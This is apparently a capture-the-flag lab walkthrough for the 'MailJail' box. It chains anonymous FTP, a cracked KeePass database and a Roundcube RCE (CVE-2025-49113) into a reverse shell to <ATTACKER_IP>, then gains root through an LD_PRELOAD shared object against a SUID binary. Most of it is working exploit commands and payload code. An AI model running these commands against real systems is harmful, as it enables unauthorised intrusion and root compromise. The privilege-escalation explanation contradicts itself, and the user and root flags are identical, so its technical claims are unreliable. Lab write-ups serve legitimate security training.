---
title: MailJail
date: 2026-07-29 12:45:00 +0000
categories: [Walkthroughs, WebSecurity]
tags: [pt-garage, roundcube, ftp, keepass, ld_preload, privesc, web-exploitation, WebSecurity]

image:
    path: /assets/img/custom_banners/2026-07-29-ptg-mailjail_banner.png
---

**CVE-2025-49113 — Roundcube RCE → LD_PRELOAD SUID PrivEsc**

## Phase 1 — Recon
```bash
nmap -sC -sV -p21,8080 <TARGET_IP>
```
Anonymous FTP and Roundcube webmail on 8080.

## Phase 2 — Anonymous FTP → KeePass DB
```bash
ftp <TARGET_IP>
Name: anonymous
Password: (blank)
ftp> get creds.kdbx
ftp> bye
```
Crack/open the KeePass DB (password: `abc123`):
```bash
keepassxc-cli show creds.kdbx "Roundcube Login" -a Username -a Password
```
**Note:** Credentials: `www-data-mail / computer1`

## Phase 3 — Roundcube Login
```bash
http://<TARGET_IP>:8080/roundcube/
# login: www-data-mail / computer1
```

## Phase 4 — CVE-2025-49113 Exploit
Roundcube 1.6.10 is vulnerable to CVE-2025-49113, a post-auth PHP object injection in the `_from` parameter of the URL, leading to RCE. Use the public PoC:
```bash
python3 CVE-2025-49113.py -u http://<TARGET_IP>:8080/roundcube/ \
 -c 'www-data-mail:computer1' --cmd 'bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1"'
```

## Phase 5 — Shell & User Flag
```bash
nc -lvnp 4444
cat /home/www-data/local.txt
```

## Phase 6 — Privilege Escalation (LD_PRELOAD via SUID)
A custom SUID binary exists at `/usr/local/bin/suidprog` that calls `system("/bin/bash")` after `setuid(0)`. Since it links libc dynamically and drops privileges before exec, check if `LD_PRELOAD` is honoured (it generally isn't for true SUID binaries unless `AT_SECURE` handling is broken — this lab's binary is intentionally exploitable):
```bash
cat <<'EOF' > /tmp/preload.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
 setuid(0); setgid(0);
 system("/bin/bash -p");
}
EOF
gcc -fPIC -shared -o /tmp/preload.so /tmp/preload.c -nostartfiles
LD_PRELOAD=/tmp/preload.so /usr/local/bin/suidprog
```
**Note:** Because the binary is 4755 (SUID root) and doesn't drop the environment before invoking system(), `LD_PRELOAD` is inherited by the child shell.

## Phase 7 — Root Flag
```bash
cat /root/proof.txt
```

## Flags

| Type | Flag | Path |
|---|---|---|
| user | 6a99c575ab87f8c7d1ed1e52e7e349ce | `/home/www-data/local.txt` |
| root | 6a99c575ab87f8c7d1ed1e52e7e349ce | `/root/proof.txt` |
